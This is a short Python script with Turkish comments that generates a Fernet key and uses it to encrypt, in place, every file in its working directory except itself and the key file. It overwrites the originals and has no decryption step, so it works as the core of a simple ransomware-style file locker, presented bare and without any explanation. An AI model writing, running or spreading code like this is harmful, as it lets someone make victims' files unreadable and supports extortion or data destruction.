import os
from cryptography.fernet import Fernet

# Anahtar dosyası oluştur
anahtar_dosya = open("anahtar.key", "wb")
anahtar = Fernet.generate_key()
anahtar_dosya.write(anahtar)
anahtar_dosya.close()

# Dosyaları listele
dosyalar = []
for dosya in os.listdir():
    if os.path.isfile(dosya) and dosya != "sifrele.py" and dosya != "anahtar.key":
        dosyalar.append(dosya)

# Şifreleme işlemi
with open("anahtar.key", "rb") as anahtar_dosya:
    anahtar = anahtar_dosya.read()
    fernet = Fernet(anahtar)

for dosya in dosyalar:
    with open(dosya, "rb") as okunan_dosya:
        icerik = okunan_dosya.read()
        sifreli_icerik = fernet.encrypt(icerik)
    
    with open(dosya, "wb") as sifrelenen_dosya:
        sifrelenen_dosya.write(sifreli_icerik)
